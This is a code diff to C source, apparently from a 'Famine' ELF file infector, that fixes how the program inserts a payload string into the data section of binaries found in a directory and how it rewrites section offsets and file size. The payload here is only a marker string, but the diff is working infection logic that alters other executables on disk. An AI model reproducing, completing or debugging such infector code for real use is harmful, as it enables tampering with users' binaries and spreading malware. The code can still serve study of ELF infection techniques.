@@ -1,6 +1,5 @@
 #include "famine.h"
-
-const char *payload = "HelloWorld";
+const char *payload = "HelloWorldaaaaa";
 
 static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     size_t      i;
@@ -159,11 +158,11 @@ static int  appendSignature(struct bfile file, Elf64_Shdr *dataHeader) {
   size_t  toAdd;
   size_t  total;
 
-  i = file.size;
+  i = file.size - 1;
   tmp = (char *)file.header;
   toAdd = strlen(payload) + 1;
   total = file.size - (dataHeader->sh_offset + dataHeader->sh_size);
-  while (total != i) {
+  while (i > total) {
     tmp[i + toAdd] = tmp[i];
     i -= 1;
   }
@@ -186,10 +185,13 @@ static int  infectFile(const char *dirname, struct dirent *file) {
     return (0);
   dprintf(1, "File %s is compatible\n", file->d_name);
   data = getDataSectionHeader(header.header);
-  data->sh_size += strlen(payload);
+  data->sh_size += strlen(payload) + 1;
+  size_t  offset;
+  offset = data->sh_offset;
   appendSignature(header, data);
+  header.size += strlen(payload) + 1;
   dprintf(1, "Changed data name\n");
-  updateOffsets(header.header, data->sh_offset, strlen(payload));
+  updateOffsets(header.header, offset, strlen(payload) + 1);
   writeToFile(dirname, file->d_name, header);
   return (0);
 }
